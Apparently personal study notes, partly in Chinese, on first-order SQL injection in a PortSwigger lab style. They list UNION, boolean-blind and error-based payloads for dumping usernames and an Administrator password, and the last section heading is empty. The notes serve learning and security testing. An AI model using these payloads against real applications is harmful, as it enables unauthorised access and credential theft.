# 1. First-order SQL

First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.

## 1.1 Union

### 1.1.1 method

```sql
' ORDER BY 1-- 

' ORDER BY 2-- 

' ORDER BY 3-- etc.

' UNION SELECT NULL-- 

' UNION SELECT NULL,NULL-- 

' UNION SELECT NULL,NULL,NULL-- etc. 
```

(All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.)

### 1.1.2 Finding columns with a useful data type

```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 

' UNION SELECT NULL,'a',NULL,NULL-- 

' UNION SELECT NULL,NULL,'a',NULL-- 

' UNION SELECT NULL,NULL,NULL,'a'--
```

### 1.1.3 Using a SQL injection UNION attack to retrieve interesting data

```sql
' UNION SELECT username, password FROM users--
```

### 1.1.4 Retrieving multiple values within a single column

```sql
' UNION SELECT username || '~' || password FROM users--
```

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.



The results from the query contain all the usernames and passwords, for example:

```sql
... administrator~s3cure
wiener~peter
carlos~montoya ...
```

Different databases use different syntax to perform string concatenation. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).



## 1.2 Blind SQL injection vulnerabilities

### 1.2.1 Exploiting blind SQL injection by triggering conditional responses

```sql
…xyz' AND '1'='1 …xyz' AND '1'='2
```

- The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.



确定有user表: (SELECT 'a' FROM users LIMIT 1) = 'a'

如果你写的子查询： `(SELECT 'a' FROM users)` 如果 `users` 表里有 100 个用户，这个查询会返回 100 个 `'a'`。

当你拿 **100个 'a'** 去跟右边的 **1个 'a'** 做比较时 (`= 'a'`)，数据库会报错说：“子查询返回了多行数据，我没法比！”。这会导致注入失败。

加上 `LIMIT 1` 确保了只返回**一个值**



We can continue this process to systematically determine the full password for the `Administrator` user:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```



### 1.2.2 Error-based SQL injection

#### Exploiting blind SQL injection by triggering conditional errors

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

step：

```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

`WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.



#### Extracting sensitive data via verbose SQL error messages















